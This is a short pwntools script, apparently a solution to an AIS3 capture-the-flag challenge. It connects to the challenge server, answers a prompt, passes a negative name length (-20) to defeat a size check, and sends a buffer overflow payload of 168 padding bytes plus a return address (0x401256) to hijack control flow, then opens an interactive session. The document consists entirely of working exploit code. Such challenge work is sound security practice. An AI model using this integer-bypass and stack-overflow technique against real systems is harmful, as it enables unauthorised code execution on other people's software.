#print("A" * 168 + 'B' * 8)
from pwn import *

#p = process('./chal')

p = remote('chals1.ais3.org', '60597')
p.recvuntil('你願意把剩餘的人生交給我嗎?\n')
p.sendline('yes')

p.recvuntil('告訴我你的名字的長度:')
p.sendline("-20")

p.recvuntil('告訴我你的名字:')

payload = b'A' * 168
payload += p64(0x401256)
p.sendline(payload)

p.interactive()